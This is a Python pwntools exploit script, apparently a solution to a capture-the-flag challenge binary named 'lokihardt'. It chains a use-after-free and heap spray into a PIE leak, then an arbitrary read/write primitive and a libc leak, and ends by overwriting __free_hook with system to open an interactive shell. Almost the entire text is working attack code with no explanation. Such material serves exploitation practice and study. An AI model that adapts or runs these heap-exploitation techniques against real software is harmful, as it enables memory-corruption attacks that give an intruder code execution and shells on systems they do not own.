from pwn import *
context.arch = 'amd64'    # i386 / arm
# r = remote('localhost', 9027)
r = process('./lokihardt')

print "stage1. acquiring partial memory leak... (PIE base)"
r.recvuntil('> ')
def Alloc(idx, rdata, wdata):
    r.sendline('1')     # Alloc
    r.recvuntil('idx? ')
    r.sendline('0')     # idx : 0
    r.sendline(rdata)   # rdata
    r.sendline(wdata)     # wdata

def Delete(idx):
    r.recvuntil('> ')
    r.sendline('2')     # Delete
    r.recvuntil('idx? ')
    r.sendline(str(idx))

def Use(idx):
    r.sendline('3')  # Use
    r.recvuntil('idx? ')
    r.sendline(str(idx))     # [0] is dangling pointer

def gc():
    r.recvuntil('> ')
    r.sendline('4')

# the most ticky thing here is that it used a fixed addr to spray
# 0xffffffffff600000
# and avoid the crash
leak = ''
while True:
    Alloc(0, 'A'*255, 'B'*15)
    Delete(1)
    gc()

    # heap spray
    for i in xrange(5):
        r.recvuntil('> ')
        r.sendline('5')     # Spray
        r.send((pack(0xffffffffff600000)*2)*15 + (pack(0xffffffffff600000) + 'r'*8))   # rdata
        r.sendline('read\x00ZZZZZZZZZZ')    # wdata
    r.recvuntil('> ')

    Use(0)
    leak = r.recvuntil('> ')
    if len(leak) > 255:
        break;

pie_rw_base = int(leak[:8][::-1].encode('hex'), 16)
pie_rw_base = pie_rw_base & 0xfffffffffffff000
pie_rw_base += 0x201000
print 'got pie rw base : ', hex(pie_rw_base)
gdb.attach(r)

def mem_write(addr, val):
    # Fully arbitrary write!
    while True:
        Alloc(0, 'A'*255, 'B'*15)
        Delete(1)
        gc()

        fake_len = 8
        write_addr = addr
        write_val = val
        for i in xrange(5):
            r.recvuntil('> ')
            r.sendline('5')     # Spray
            r.send((pack(0xffffffffff600000)*2)*15 + (pack(write_addr) + pack(fake_len)))   # rdata
            r.sendline('write\x00ZZZZZZZZZ')    # wdata
        r.recvuntil('> ')

        Use(0)
        data = r.recv(10)
        if len(data.split('data'))==2:
            r.send( pack(write_val) )    # write-what-where!
            r.recvuntil('> ')
            break
        r.recvuntil('> ')

def mem_read(addr):
    mem_write(addr + 0x120, 0x64616572)   # 'read'
    mem_write(pie_rw_base + 0x90, addr)
    mem_write(addr + 0x110, addr + 0x120)
    Use(2)
    leak = r.recvuntil('> ')
    return leak

print 'stage2. extending memory leak... (libc base)'
leak = mem_read(pie_rw_base - 0x40)
setvbuf_addr = int(leak[:8][::-1].encode('hex'), 16)
free_hook = setvbuf_addr + 0x2cf028
system_addr = setvbuf_addr - 0xb1400
print 'setvbuf addr:', hex(setvbuf_addr)
print 'free_hook addr:', hex(free_hook)
print 'system addr:', hex(system_addr)

print 'stage3. hijacking RIP and executing shell... :)'
mem_write(free_hook, system_addr)
Alloc(6, 'sh\x00' + 'A'*252, 'B'*15)
Delete(6)
gc()
r.interactive()


